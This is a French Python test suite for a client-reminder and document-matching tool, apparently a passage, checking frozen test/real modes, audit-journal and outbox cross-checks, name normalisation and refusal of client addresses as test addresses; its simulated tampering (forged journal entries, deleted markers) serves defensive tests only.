def test_mode_fige_toute_operation_refuse_l_autre_mode_avant_toute_ecriture(entree, tmp_path, nom, cree_en):
    inst, ident = _instance_figee(tmp_path, entree, cree_en)
    if nom == "reparer":
        with open(inst.audit, "ab") as f:
            f.write(b'{"acteur":"sys')                                      # un journal a reparer, que l'on ne doit PAS toucher
    avant = (etat_depot(inst), inst.audit.read_bytes(), empreintes(inst.racine, "sortie", "outbox"))
    autre = cree_en == "reel"                                               # le mode demande est l'inverse
    with pytest.raises(cycle.ModeInstanceIncompatible,
                       match=f"cette instance a ete creee en mode {cree_en} .*pour changer, creer une nouvelle instance"):
        _appeler(nom, inst, entree, ident, mode_test=autre)
    assert (etat_depot(inst), inst.audit.read_bytes(), empreintes(inst.racine, "sortie", "outbox")) == avant
    # Le MEME mode n'est jamais refuse pour cette raison (l'operation peut echouer pour une autre).
    try:
        _appeler(nom, inst, entree, ident, mode_test=not autre)
    except cycle.ModeInstanceIncompatible:
        pytest.fail("le mode de l'instance a ete refuse alors qu'il est le bon")
    except Exception:  # noqa: BLE001
        pass


@pytest.mark.parametrize("nom", ["arbitrer", "trancher", "reparer", "rattacher_forcer"])
def test_mode_fige_est_controle_avant_le_role(entree, tmp_path, nom):
    """Mode ET role faux : c'est le mode qui est dit (message le plus utile)."""
    inst, ident = _instance_figee(tmp_path, entree, "reel")
    with pytest.raises(cycle.ModeInstanceIncompatible, match="creee en mode reel"):
        _appeler(nom, inst, entree, ident, mode_test=True, par=VALIDEUSE)       # simple validatrice


def test_mode_fige_par_config_json_dans_les_deux_sens(entree, tmp_path):
    inst = nouvelle_instance(tmp_path / "reel")
    lancer(entree, inst, J0)
    ecrire_config(inst, mode_test=True)                                     # config bascule apres coup
    b = cycle.brouillons(inst)[0]
    with pytest.raises(cycle.ModeInstanceIncompatible, match="creee en mode reel .*demandee en mode test"):
        cycle.valider_relance(inst, b.id_relance, VALIDEUSE, maintenant=a_10h(J0))
    inst2 = nouvelle_instance(tmp_path / "test")
    ecrire_config(inst2, mode_test=True)
    lancer(entree, inst2, J0)
    ecrire_config(inst2, mode_test=False)
    b2 = cycle.brouillons(inst2)[0]
    with pytest.raises(cycle.ModeInstanceIncompatible, match="creee en mode test .*demandee en mode reel"):
        cycle.envoyer_relance(inst2, b2.id_relance, maintenant=a_10h(J0), par=VALIDEUSE)
    assert emls(inst2) == []


@pytest.mark.parametrize("cree_en, flag", [("test", False), ("reel", True)])
def test_mode_fige_cli_les_sept_commandes_dans_les_deux_sens(entree, tmp_path, capsys, cree_en, flag):
    inst = nouvelle_instance(tmp_path / "i")
    creation = ["cycle", "--entree", str(entree)] + (["--mode-test"] if cree_en == "test" else [])
    assert cli(capsys, inst, *creation)[0] == 0
    ident = next(x for x in cycle.brouillons(inst) if x.destinataire == ORIGINE).id_relance
    erreur = ["--mode-test"] if flag else []            # test cree -> sans drapeau ; reel cree -> avec drapeau
    avant = (etat_depot(inst), inst.audit.read_bytes())
    commandes = [
        ["cycle", "--entree", str(entree)],
        ["valider", ident, "--par", RESPONSABLE],
        ["envoyer", ident, "--par", RESPONSABLE],
        ["rattacher", "--dossier", "ALPHA", "--reference", "A-001", "--piece", "P-1", "--par", RESPONSABLE],
        ["arbitrer", "--dossier", "ALPHA", "--reference", "A-001", "--motif", "x", "--par", RESPONSABLE],
        ["trancher", ident, "--parti", "--par", RESPONSABLE],
        ["reparer-audit", "--par", RESPONSABLE],
    ]
    for commande in commandes:
        rc, out, err = cli(capsys, inst, *commande, *erreur)
        assert rc == 1 and f"REFUS (ModeInstanceIncompatible) : cette instance a ete creee en mode {cree_en}" in err, commande
    assert (etat_depot(inst), inst.audit.read_bytes()) == avant and emls(inst) == []


def test_attaque_du_reviewer_cycle_mode_test_puis_envoi_sans_le_drapeau(tmp_path, capsys):
    """Un dossier SANS circuit est tolere en test ; ses brouillons ne doivent jamais partir au vrai client."""
    dossiers = [["ALPHA", "Alpha SARL", "compta@alpha-sarl.fr", "M. Alpha", "15", "courtois", "", ""]]
    entree = ecrire_entree(tmp_path / "e", dossiers=dossiers, operations=[OPERATIONS[0]])
    inst = nouvelle_instance(tmp_path / "i")
    assert cli(capsys, inst, "cycle", "--entree", str(entree), "--mode-test")[0] == 0
    ident = cycle.brouillons(inst)[0].id_relance
    assert cli(capsys, inst, "valider", ident, "--par", VALIDEUSE)[0] == 1
    assert cli(capsys, inst, "envoyer", ident, "--par", VALIDEUSE)[0] == 1
    assert emls(inst) == [] and cycle.brouillons(inst)[0].statut is StatutBrouillon.BROUILLON
    assert cli(capsys, inst, "valider", ident, "--par", VALIDEUSE, "--mode-test")[0] == 0     # le bon mode
    assert cli(capsys, inst, "envoyer", ident, "--par", VALIDEUSE, "--mode-test")[0] == 0
    msg, _ = _eml_sorti(inst, ident)
    assert msg["To"] == ADRESSE_TEST


def test_mode_fige_les_lectures_ne_sont_pas_bloquees(entree, tmp_path):
    inst, ident = _instance_figee(tmp_path, entree, "test")
    assert cycle.pieces(inst) and cycle.brouillons(inst) and cycle.lister_file(inst) == []
    assert cycle.suivi_pieces(inst, J0).lignes and cycle.verifier_audit(inst).ok
    assert cycle.controler_envois(inst).ok and cycle.exporter(inst, tmp_path / "x.json").exists()


def test_mode_fige_marqueurs_contradictoires_refus(entree, tmp_path):
    inst, ident = _instance_figee(tmp_path, entree, "test")
    with Depot(inst.depot) as d:
        d.marquer_vu("mode-instance:reel")                                 # base alteree
    for mode in (True, False):
        with pytest.raises(cycle.ModeInstanceIncompatible, match="incoherent"):
            cycle.valider_relance(inst, ident, VALIDEUSE, maintenant=a_10h(J0), mode_test=mode)
    with pytest.raises(cycle.ModeInstanceIncompatible):
        cycle.mode_instance(inst)


def test_mode_fige_instance_ancienne_sans_marqueur_est_figee_au_prochain_cycle(entree, tmp_path):
    inst = nouvelle_instance(tmp_path / "i")
    lancer(entree, inst, J0)
    with sqlite3.connect(inst.depot) as c:                                  # instance d'avant cette regle :
        c.execute("DELETE FROM vus WHERE cle LIKE 'mode-instance:%'")       # ni marqueur en base...
    _reecrire_journal(inst, lambda e: None if e.action == "mode_instance" else (e.acteur, e.details))   # ...ni au journal
    assert cycle.mode_instance(inst) is None and cycle.controler_mode(inst) == ()
    lancer(entree, inst, jour(1), mode_test=True)                           # le prochain cycle choisit, et fige
    assert cycle.mode_instance(inst) == "test"
    assert _entrees_audit(inst, "mode_instance")[-1].details["pieces_deja_presentes"] == 5


# --- A7 : un fichier n'appartient qu'a un dossier -------------------------------------------------


def test_a7_meme_id_piece_refusee_pour_un_autre_dossier_forcer_compris(entree, inst):
    lancer(entree, inst, J0)
    cycle.rattacher_piece(inst, VALIDEUSE, maintenant=a_10h(J0), dossier="ALPHA", reference="A-001",
                          id_piece="facture.pdf#abc123def456")
    avant = (etat_depot(inst), actions_audit(inst))
    for par, kw in ((VALIDEUSE, {}), (RESPONSABLE, dict(forcer=True, motif="verifie"))):
        with pytest.raises(cycle.ErreurCycle, match=r"deja rattachee au dossier ALPHA \(reference A-001\) "
                                                    r"et ne peut pas l'etre au dossier BETA") as exc:
            cycle.rattacher_piece(inst, par, maintenant=a_10h(J0), dossier="BETA", reference="B-001",
                                  id_piece=" facture.pdf#abc123def456 ", **kw)
        assert "aucun detachement" in str(exc.value)
    assert etat_depot(inst) == avant[0]
    refus = _entrees_audit(inst, "rattachement_refuse")
    assert len(refus) == 2 and refus[0].details["dossier_proprietaire"] == "ALPHA"
    assert refus[1].details["forcer"] is True and "rattachement_force" not in actions_audit(inst)
    assert pieces_par_ref(inst)["B-001"].etat is EtatPiece.ATTENDUE


def test_a7_meme_id_piece_meme_dossier_reste_possible(entree, inst):
    lancer(entree, inst, J0)
    cycle.rattacher_piece(inst, VALIDEUSE, maintenant=a_10h(J0), dossier="ALPHA", reference="A-001", id_piece="P-X")
    p = cycle.rattacher_piece(inst, VALIDEUSE, maintenant=a_10h(J0), dossier="ALPHA", reference="A-002", id_piece="P-X")
    assert (p.dossier, p.reference, p.etat) == ("ALPHA", "A-002", EtatPiece.RECUE)


def test_a7_le_proprietaire_vaut_aussi_avec_une_decision_de_routage(entree, inst):
    d = _proposition_alpha(inst, entree)
    cycle.rattacher_piece(inst, VALIDEUSE, maintenant=a_10h(jour(1)), message_id=d.message_id)    # id = fichier#empreinte
    ecrire_eml(inst.entrant, "2.eml", expediteur="pieces@cabinet-relais.fr", message_id="<copie@x>",
               corps="230,40 EUR", fichiers=(("loxam_2026-09-03.pdf", b"%PDF-loxam"),))        # MEME fichier
    lancer(entree, inst, jour(2))
    (d2,) = cycle.lister_file(inst)
    with pytest.raises(cycle.ErreurCycle, match="deja rattachee au dossier ALPHA"):
        cycle.rattacher_piece(inst, VALIDEUSE, maintenant=a_10h(jour(2)), message_id=d2.message_id,
                              dossier="BETA", reference="B-001")
    assert cycle.lister_file(inst) == [d2] and pieces_par_ref(inst)["B-001"].etat is EtatPiece.ATTENDUE


# --- F3 : noms NFC / NFD ----------------------------------------------------------------------------


@pytest.mark.parametrize("ecrit, saisi", [("NFD", "NFC"), ("NFC", "NFD")])
def test_f3_les_noms_sont_compares_en_nfc(tmp_path, ecrit, saisi):
    inst = nouvelle_instance(tmp_path / "i", validateurs=None)
    nom = "  Hélène Roux  "                                     # espaces de bord retires
    inst.validateurs.write_bytes(("﻿# equipe\r\n" + unicodedata.normalize(ecrit, nom) + "\r\n").encode("utf-8"))
    inst.responsables.write_bytes(unicodedata.normalize(ecrit, "Zoé Responsable\n").encode("utf-8"))
    attendu = unicodedata.normalize("NFC", "Hélène Roux")
    assert cycle.lire_validateurs(inst) == (attendu,)                       # forme canonique : NFC, espaces de bord
    assert cycle.exiger_validateur(inst, unicodedata.normalize(saisi, " hélène ROUX ")) == attendu
    for truque in ("Hélène  Roux", "Hélène\u00a0Roux"):                       # espaces internes : autre nom
        with pytest.raises(cycle.ValidateurRefuse):
            cycle.exiger_validateur(inst, unicodedata.normalize(saisi, truque))
    assert cycle.exiger_responsable(inst, unicodedata.normalize(saisi, "ZOÉ responsable")) == \
        unicodedata.normalize("NFC", "Zoé Responsable")
    with pytest.raises(cycle.ValidateurRefuse):
        cycle.exiger_validateur(inst, "Helene Roux")                        # un accent absent reste un autre nom


def test_f3_nom_nfd_en_ligne_de_commande_et_au_journal(entree, tmp_path, capsys):
    inst = nouvelle_instance(tmp_path / "i", validateurs=None)
    inst.validateurs.write_bytes(unicodedata.normalize("NFD", "Hélène Roux\n").encode("utf-8"))
    inst.responsables.write_bytes(b"Paul Martin\n")
    lancer(entree, inst, J0)
    ident = next(x for x in cycle.brouillons(inst) if x.destinataire == ORIGINE).id_relance
    rc, out, _ = cli(capsys, inst, "valider", ident, "--par", unicodedata.normalize("NFC", "hélène roux"))
    assert rc == 0
    (valide,) = _entrees_audit(inst, "valide")
    assert valide.acteur == unicodedata.normalize("NFC", "Hélène Roux")            # journalise en NFC
    cycle.envoyer_relance(inst, ident, maintenant=a_10h(J0), par="Paul Martin")
    assert cycle.controler_envois(inst).ok                                         # la recette compare en NFC


# --- A17 : recoupement avec la base et l'outbox ---------------------------------------------------


def _forger_valide(inst: cycle.Instance, ident: str, par: str = VALIDEUSE, dest: str = ORIGINE) -> None:
    JournalAudit(inst.audit).ecrire(par, "valide", ident, {"par": par, "destinataire": dest, "niveau": 1})


def _forger_envoi(inst: cycle.Instance, ident: str, par: str = VALIDEUSE, dest: str = ORIGINE,
                  envoye_par: str | None = "Paul Martin") -> None:
    JournalAudit(inst.audit).ecrire("systeme", "envoi_effectue", ident, {
        "valide_par": par, "destinataire": dest, "identifiant_externe": "<x@y>", "envoye_par": envoye_par})


def _brouillon_alpha(inst: cycle.Instance) -> Brouillon:
    return next(x for x in cycle.brouillons(inst) if x.destinataire == ORIGINE)


def test_a17_cas_sain_base_journal_outbox_concordent(entree, inst, capsys):
    _envoi_sain(inst, entree)
    controle = cycle.controler_envois(inst)
    assert controle.ok and controle.ecarts == () and len(emls(inst)) == 1
    assert cli(capsys, inst, "controler-envois")[0] == 0


def test_a17_cas_sain_instance_de_test(entree, tmp_path, capsys):
    inst = nouvelle_instance(tmp_path / "t")
    ecrire_config(inst, mode_test=True)
    _envoi_sain(inst, entree)
    assert cycle.controler_envois(inst).ok and cli(capsys, inst, "controler-envois")[0] == 0


def test_a17_eml_dans_outbox_sans_trace_au_journal(entree, inst, capsys):
    lancer(entree, inst, J0)
    b = _brouillon_alpha(inst)
    envoi.ExpediteurDossier(inst.outbox).envoyer(_dc.replace(b, statut=StatutBrouillon.EN_COURS, valide_par=VALIDEUSE))
    controle = cycle.controler_envois(inst)
    assert not controle.ok and controle.lignes == ()
    assert controle.ecarts == (f"outbox/{b.id_relance}.eml : .eml sans trace dans le journal "
                               "(aucune entree d'envoi pour ce brouillon)",)
    rc, out, _ = cli(capsys, inst, "controler-envois")
    assert rc == 1 and "ECART : outbox/" in out and "1 envoi(s) controle(s)" not in out


def test_a17_eml_d_un_envoi_incertain_est_signale_comme_tel(entree, inst):
    lancer(entree, inst, J0)
    b = _brouillon_alpha(inst)
    cycle.valider_relance(inst, b.id_relance, VALIDEUSE, maintenant=a_10h(J0))
    with Depot(inst.depot) as d:
        d.maj_brouillon(_dc.replace(d.charger_brouillon(b.id_relance), statut=StatutBrouillon.EN_COURS))
    envoi.ExpediteurDossier(inst.outbox).envoyer(_dc.replace(b, statut=StatutBrouillon.EN_COURS, valide_par=VALIDEUSE))
    (ecart,) = cycle.controler_envois(inst).ecarts
    assert "envoi incertain non tranche" in ecart and ".eml sans trace" not in ecart


def test_a17_brouillon_envoyee_en_base_sans_journal(entree, inst, capsys):
    lancer(entree, inst, J0)
    b = _brouillon_alpha(inst)
    with Depot(inst.depot) as d:
        d.maj_brouillon(_dc.replace(b, statut=StatutBrouillon.VALIDEE, valide_par="Mallory", valide_le=a_10h(J0)))
        d.maj_brouillon(_dc.replace(b, statut=StatutBrouillon.EN_COURS, valide_par="Mallory", valide_le=a_10h(J0)))
        d.maj_brouillon(_dc.replace(b, statut=StatutBrouillon.ENVOYEE, valide_par="Mallory", valide_le=a_10h(J0),
                                    envoye_le=a_10h(J0)))
    controle = cycle.controler_envois(inst)
    assert not controle.ok
    assert controle.ecarts == (f"brouillon {b.id_relance} ENVOYEE en base sans entree valide ni envoi_effectue au journal",)
    assert cli(capsys, inst, "controler-envois")[0] == 1


def test_a17_paire_forgee_pour_un_brouillon_inexistant(entree, inst):
    _envoi_sain(inst, entree)
    _forger_valide(inst, "FORGE1")
    _forger_envoi(inst, "FORGE1")
    controle = cycle.controler_envois(inst)
    forge = next(l for l in controle.lignes if l.id_relance == "FORGE1")
    assert not controle.ok and forge.anomalies == ("brouillon absent de la base",)
    assert all(l.anomalies == () for l in controle.lignes if l.id_relance != "FORGE1")


def test_a17_paire_forgee_pour_un_brouillon_non_envoye_ou_au_valide_par_different(entree, inst):
    _envoi_sain(inst, entree)
    autre = next(x for x in cycle.brouillons(inst) if x.statut is StatutBrouillon.BROUILLON)
    _forger_valide(inst, autre.id_relance, dest=autre.destinataire)
    _forger_envoi(inst, autre.id_relance, dest=autre.destinataire)
    ligne = next(l for l in cycle.controler_envois(inst).lignes if l.id_relance == autre.id_relance)
    assert ligne.anomalies == ("brouillon au statut brouillon en base, pas envoyee",)
    # Journal coherent en lui-meme, mais la base dit autre chose : le `valide_par` de la base fait foi.
    _reecrire_journal(inst, lambda e: ("Paul Martin", {**e.details, "par": "Paul Martin"}) if (
        e.action == "valide" and e.objet != autre.id_relance) else (
        (e.acteur, {**e.details, "valide_par": "Paul Martin"}) if (
            e.action == "envoi_effectue" and e.objet != autre.id_relance) else (e.acteur, e.details)))
    sain = next(l for l in cycle.controler_envois(inst).lignes if l.id_relance != autre.id_relance)
    assert sain.anomalies == ("`valide_par` en base ('Marie Durand') different du journal ('Paul Martin')",)


def test_a17_brouillon_rejete_puis_envoye(entree, inst):
    lancer(entree, inst, J0)
    b = _brouillon_alpha(inst)
    cycle.valider_relance(inst, b.id_relance, VALIDEUSE, maintenant=a_10h(J0))
    cycle.rejeter_relance(inst, b.id_relance, VALIDEUSE, "non", maintenant=a_10h(J0))
    _forger_envoi(inst, b.id_relance, dest=b.destinataire)
    (ligne,) = cycle.controler_envois(inst).lignes
    assert any(a.startswith("brouillon rejete (entree ") and a.endswith(") puis envoye") for a in ligne.anomalies)
    assert any("statut rejetee en base" in a for a in ligne.anomalies)


def test_a17_envoi_sans_declencheur_nominatif(entree, inst, capsys):
    b = _valider_premier(inst, entree)
    cycle.envoyer_relance(inst, b.id_relance, maintenant=a_10h(J0))                  # API sans `par`
    (ligne,) = cycle.controler_envois(inst).lignes
    assert ligne.anomalies == ("envoi non nominatif (`envoye_par` absent : qui l'a declenche ?)",)
    rc, out, _ = cli(capsys, inst, "controler-envois")
    assert rc == 1 and "envoi non nominatif" in out


# --- 5e passage : mode recoupe avec le journal, adresse_test jamais un client, controle lineaire ---


def _supprimer_marqueurs_de_mode(inst: cycle.Instance) -> None:
    with sqlite3.connect(inst.depot) as c:
        c.execute("DELETE FROM vus WHERE cle LIKE 'mode-instance:%'")


@pytest.mark.parametrize("cree_en, demande", [("test", False), ("reel", True)])
def test_mode_journal_marqueur_supprime_le_journal_tient_le_mode(entree, tmp_path, cree_en, demande):
    inst, ident = _instance_figee(tmp_path, entree, cree_en)
    _supprimer_marqueurs_de_mode(inst)
    assert cycle.mode_instance(inst) == cree_en                       # la base ne dit plus rien, le journal si
    avant = (etat_depot(inst), emls(inst))
    for appel in (lambda: lancer(entree, inst, jour(1), mode_test=demande),
                  lambda: cycle.valider_relance(inst, ident, VALIDEUSE, maintenant=a_10h(J0), mode_test=demande)):
        with pytest.raises(cycle.ModeInstanceIncompatible, match=f"creee en mode {cree_en}"):
            appel()
    assert (etat_depot(inst), emls(inst)) == avant                    # rien n'a ete refige dans l'autre mode
    assert [e for e in _entrees_audit(inst, "mode_instance")] == _entrees_audit(inst, "mode_instance")[:1]


@pytest.mark.parametrize("mode_test", [True, False])
def test_mode_journal_marqueur_supprime_meme_mode_le_marqueur_est_retabli(entree, tmp_path, mode_test):
    inst, _ = _instance_figee(tmp_path, entree, "test" if mode_test else "reel")
    _supprimer_marqueurs_de_mode(inst)
    lancer(entree, inst, jour(1), mode_test=mode_test)
    assert cycle.mode_instance(inst) == ("test" if mode_test else "reel")
    with Depot(inst.depot) as d:
        assert d.est_vu(f"mode-instance:{'test' if mode_test else 'reel'}")
    assert len(_entrees_audit(inst, "mode_instance")) == 1            # pas de seconde entree contradictoire
    (retabli,) = _entrees_audit(inst, "mode_marqueur_retabli")
    assert retabli.details["mode"] == ("test" if mode_test else "reel")
    assert cycle.controler_mode(inst) == ()


@pytest.mark.parametrize("cree_en, demande", [("test", False), ("reel", True)])
def test_mode_journal_base_recreee_dans_l_autre_mode_refus(entree, tmp_path, cree_en, demande):
    inst, _ = _instance_figee(tmp_path, entree, cree_en)
    for f in inst.racine.glob("depot.sqlite*"):
        f.unlink()
    with pytest.raises(cycle.ModeInstanceIncompatible, match=f"creee en mode {cree_en}"):
        lancer(entree, inst, J0, mode_test=demande)
    assert len(_entrees_audit(inst, "mode_instance")) == 1


def test_mode_journal_contradiction_base_contre_journal_signalee_partout(entree, tmp_path, capsys):
    inst, ident = _instance_figee(tmp_path, entree, "test")
    with sqlite3.connect(inst.depot) as c:                            # base ALTEREE : le marqueur dit « reel »
        c.execute("DELETE FROM vus WHERE cle LIKE 'mode-instance:%'")
    with Depot(inst.depot) as d:
        d.marquer_vu("mode-instance:reel")
    (probleme,) = cycle.controler_mode(inst)
    assert "la base dit reel" in probleme and "le journal dit test" in probleme
    for mode in (True, False):
        with pytest.raises(cycle.ModeInstanceIncompatible, match="contradictoire"):
            cycle.valider_relance(inst, ident, VALIDEUSE, maintenant=a_10h(J0), mode_test=mode)
    with pytest.raises(cycle.ModeInstanceIncompatible):
        cycle.mode_instance(inst)
    assert any("mode de l'instance" in e for e in cycle.controler_envois(inst).ecarts)
    rc, out, _ = cli(capsys, inst, "verifier-audit")
    assert rc == 1 and "MODE INCOHERENT" in out and "le journal dit test" in out
    rc, out, _ = cli(capsys, inst, "controler-envois")
    assert rc == 1 and "mode de l'instance" in out


def test_mode_journal_deux_modes_au_journal_est_une_incoherence(entree, tmp_path):
    inst, _ = _instance_figee(tmp_path, entree, "test")
    JournalAudit(inst.audit).ecrire("systeme", "mode_instance", "instance", {"mode": "reel", "source": "forge"})
    assert any("a la fois le mode test et le mode reel" in p for p in cycle.controler_mode(inst))
    with pytest.raises(cycle.ModeInstanceIncompatible):
        lancer(entree, inst, jour(1), mode_test=True)


def test_mode_journal_instance_saine_verifier_audit_reste_ok(entree, tmp_path, capsys):
    inst, _ = _instance_figee(tmp_path, entree, "test")
    assert cycle.controler_mode(inst) == ()
    rc, out, _ = cli(capsys, inst, "verifier-audit")
    assert rc == 0 and "MODE" not in out


# adresse_test : jamais celle d'un client


def _entree_avec_domaines(tmp_path: Path, domaines: str) -> Path:
    dossiers = [DOSSIERS[0][:8] + [domaines]] + [d + [""] for d in DOSSIERS[1:]]
    entree = ecrire_entree(tmp_path / "e-dom", dossiers=dossiers)
    texte = (entree / "dossiers.csv").read_text(encoding="utf-8").splitlines()
    texte[0] += ",domaines"
    (entree / "dossiers.csv").write_text("\n".join(texte) + "\n", encoding="utf-8")
    return entree


@pytest.mark.parametrize("adresse, motif", [
    ("compta@alpha-sarl.fr", "adresse d'un client"),
    ("COMPTA@Alpha-SARL.fr", "adresse d'un client"),               # casse sans effet
    ("autre@alpha-sarl.fr", "domaine d'un client"),               # meme domaine
    ("moi@beta-sas.fr", "domaine d'un client"),
    ("pieces@cabinet-relais.fr", "adresse d'un client"),          # relais : adresse exacte
    ("x@cabinet-relais.fr", "domaine d'un client"),
])
def test_adresse_test_client_refusee_avant_toute_ecriture(entree, tmp_path, adresse, motif):
    inst = nouvelle_instance(tmp_path / "i")
    ecrire_config(inst, mode_test=True, adresse_test=adresse)
    with pytest.raises(cycle.ConfigInvalide, match=motif):
        lancer(entree, inst, J0)
    assert cycle.brouillons(inst) == [] and emls(inst) == [] and cycle.mode_instance(inst) is None


def test_adresse_test_domaine_declare_d_un_client_refusee(tmp_path):
    entree = _entree_avec_domaines(tmp_path, "alpha-conseil.fr")
    inst = nouvelle_instance(tmp_path / "i")
    ecrire_config(inst, mode_test=True, adresse_test="moi@alpha-conseil.fr")
    with pytest.raises(cycle.ConfigInvalide, match="domaine declare d'un client"):
        lancer(entree, inst, J0)
    assert cycle.brouillons(inst) == []


@pytest.mark.parametrize("adresse", [ADRESSE_TEST, "cabinet.test@gmail.com", "moi@exemple.org"])
def test_adresse_test_sans_client_acceptee(entree, tmp_path, adresse):
    inst = nouvelle_instance(tmp_path / "i")
    ecrire_config(inst, mode_test=True, adresse_test=adresse)
    lancer(entree, inst, J0)
    assert cycle.brouillons(inst)


def test_adresse_test_gmail_d_un_client_refusee_seule_l_adresse_exacte_compte(tmp_path):
    dossiers = [["ALPHA", "Alpha SARL", "alpha.compta@gmail.com", "M. Alpha", "15", "courtois", "C-DIRECT", ""]]
    entree = ecrire_entree(tmp_path / "e", dossiers=dossiers, operations=[OPERATIONS[0]])
    inst = nouvelle_instance(tmp_path / "i")
    ecrire_config(inst, mode_test=True, adresse_test="Alpha.Compta@gmail.com")
    with pytest.raises(cycle.ConfigInvalide, match="adresse d'un client"):
        lancer(entree, inst, J0)
    ecrire_config(inst, mode_test=True, adresse_test="cabinet@gmail.com")           # autre boite gmail : sans client
    lancer(entree, inst, J0)
    assert cycle.brouillons(inst)


def test_adresse_test_changee_apres_coup_envoi_refuse_rien_ne_part(entree, tmp_path):
    inst = nouvelle_instance(tmp_path / "i")
    ecrire_config(inst, mode_test=True, adresse_test=ADRESSE_TEST)
    lancer(entree, inst, J0)
    ident = next(x for x in cycle.brouillons(inst) if x.destinataire == ORIGINE).id_relance
    cycle.valider_relance(inst, ident, VALIDEUSE, maintenant=a_10h(J0))
    ecrire_config(inst, mode_test=True, adresse_test="compta@alpha-sarl.fr")
    with pytest.raises(cycle.ConfigInvalide, match="adresse d'un client"):
        cycle.envoyer_relance(inst, ident, maintenant=a_10h(J0), par=VALIDEUSE)
    assert emls(inst) == []


def test_expediteur_test_defense_en_profondeur_adresse_test_client(tmp_path):
    class Spy:
        envoyes: list = []

        def envoyer(self, brouillon):
            self.envoyes.append(brouillon)
            return "id"

    spy = Spy()
    b = Brouillon(id_relance="r1", destinataire="compta@alpha-sarl.fr", objet="o", corps="c", dossiers=("ALPHA",),
                  references=("A-001",), niveau=1, cree_le=J0, statut=StatutBrouillon.VALIDEE)
    with pytest.raises(envoi.ErreurEnvoiCertaine, match="adresse d'un client"):
        cycle.ExpediteurTest(spy, "COMPTA@alpha-sarl.fr").envoyer(b)
    assert spy.envoyes == []


def test_adresse_test_cli_refus_lisible_code_1(entree, tmp_path, capsys):
    inst = nouvelle_instance(tmp_path / "i")
    ecrire_config(inst, mode_test=True, adresse_test="compta@alpha-sarl.fr")
    rc, _, err = cli(capsys, inst, "cycle", "--entree", str(entree))
    assert rc == 1 and "adresse d'un client" in err


# controler_envois : une passe, pas de balayage par envoi


def test_controler_envois_lineaire_journal_de_66000_entrees(tmp_path):
    import time as _t
    inst = nouvelle_instance(tmp_path / "i")
    j = JournalAudit(inst.audit)
    for i in range(60000):
        j.ecrire("systeme", "piece_creee", f"p{i}", {})
    for i in range(3000):
        j.ecrire(VALIDEUSE, "valide", f"r{i}", {"par": VALIDEUSE})
        j.ecrire("systeme", "envoi_effectue", f"r{i}", {"envoye_par": VALIDEUSE})
    debut = _t.perf_counter()
    controle = cycle.controler_envois(inst)
    duree = _t.perf_counter() - debut
    assert controle.nb_entrees == 66000 and len(controle.lignes) == 3000
    assert duree < 5, f"controler_envois : {duree:.1f} s pour 66 000 entrees"


def test_controler_envois_indexe_valide_et_rejete_par_objet_resultats_inchanges(entree, inst):
    _envoi_sain(inst, entree)
    (ligne,) = cycle.controler_envois(inst).lignes
    assert ligne.anomalies == ()


def test_mode_journal_marqueur_absent_est_signale_par_controler_mode_et_verifier_audit(entree, tmp_path, capsys):
    inst, _ = _instance_figee(tmp_path, entree, "test")
    _supprimer_marqueurs_de_mode(inst)
    (probleme,) = cycle.controler_mode(inst)
    assert "le journal dit test" in probleme and "marqueur du depot est absent" in probleme
    rc, out, _ = cli(capsys, inst, "verifier-audit")
    assert rc == 1 and "MODE INCOHERENT" in out
    assert any("mode de l'instance" in e for e in cycle.controler_envois(inst).ecarts)


# --- 6e passage : base recreee jamais « guerie » ; adresse_test en forme normalisee ---------------------


def _base_supprimee(inst: cycle.Instance) -> None:
    for f in inst.racine.glob("depot.sqlite*"):
        f.unlink()


def _instance_avec_envoi(tmp_path: Path, entree: Path):
    inst = nouvelle_instance(tmp_path / "i")
    b = _envoi_sain(inst, entree)
    assert len(emls(inst)) == 1
    return inst, b


def test_base_recreee_apres_envoi_cycle_valider_envoyer_refuses_rien_ne_part(entree, tmp_path):
    inst, b = _instance_avec_envoi(tmp_path, entree)
    _base_supprimee(inst)
    audit_avant = inst.audit.read_bytes()
    for appel in (lambda: lancer(entree, inst, jour(1)),
                  lambda: cycle.valider_relance(inst, b.id_relance, VALIDEUSE, maintenant=a_10h(jour(1))),
                  lambda: cycle.envoyer_relance(inst, b.id_relance, maintenant=a_10h(jour(1)), par=VALIDEUSE),
                  lambda: cycle.rattacher_piece(inst, VALIDEUSE, maintenant=a_10h(jour(1)), dossier="ALPHA",
                                                reference="A-001", id_piece="P-1")):
        with pytest.raises(cycle.BaseRecreee, match="base recreee ou restauree"):
            appel()
    assert len(emls(inst)) == 1 and inst.audit.read_bytes() == audit_avant
    assert issubclass(cycle.BaseRecreee, cycle.ModeInstanceIncompatible)


def test_base_recreee_apres_envoi_est_signalee_par_controler_mode_verifier_audit_et_controler_envois(
        entree, tmp_path, capsys):
    inst, _ = _instance_avec_envoi(tmp_path, entree)
    assert cycle.controler_mode(inst) == ()
    _base_supprimee(inst)
    problemes = cycle.controler_mode(inst)
    assert any("base recreee ou restauree" in p and "1 brouillon(s)" in p for p in problemes)
    rc, out, _ = cli(capsys, inst, "verifier-audit")
    assert rc == 1 and "MODE INCOHERENT" in out and "base recreee ou restauree" in out
    assert any("base recreee" in e for e in cycle.controler_envois(inst).ecarts)
    rc, _, err = cli(capsys, inst, "cycle", "--entree", str(entree))
    assert rc == 1 and "REFUS (BaseRecreee)" in err


def test_base_recreee_avant_toute_decision_le_marqueur_est_retabli(entree, tmp_path):
    inst, _ = _instance_figee(tmp_path, entree, "reel")
    _base_supprimee(inst)
    lancer(entree, inst, jour(1))                                  # journal sans decision ni envoi : rien de perdu
    assert cycle.mode_instance(inst) == "reel" and cycle.controler_mode(inst) == ()
    assert len(_entrees_audit(inst, "mode_marqueur_retabli")) == 1


def test_base_recreee_rejet_aussi_est_une_decision_que_la_base_ignore(entree, tmp_path):
    inst, ident = _instance_figee(tmp_path, entree, "reel")
    cycle.rejeter_relance(inst, ident, VALIDEUSE, "non", maintenant=a_10h(J0))
    _base_supprimee(inst)
    with pytest.raises(cycle.BaseRecreee):
        lancer(entree, inst, jour(1))


def test_base_non_recreee_reste_utilisable_apres_envoi(entree, tmp_path):
    inst, _ = _instance_avec_envoi(tmp_path, entree)
    lancer(entree, inst, jour(1))
    assert cycle.controler_mode(inst) == ()


# adresse_test : formes normalisees


def _dossiers_variantes():
    from rapprochement.modeles import Dossier
    return {
        "A": Dossier("A", "Alpha", "Compta <compta@alpha-sarl.fr>", "M", circuit="C-DIRECT", domaines=("alpha-sarl.fr",)),
        "B": Dossier("B", "Beta", "gerant@gmail.com", "M", circuit="C-DIRECT"),
        "C": Dossier("C", "Gamma", "x@sous.gamma.fr", "M", circuit="C-DIRECT"),
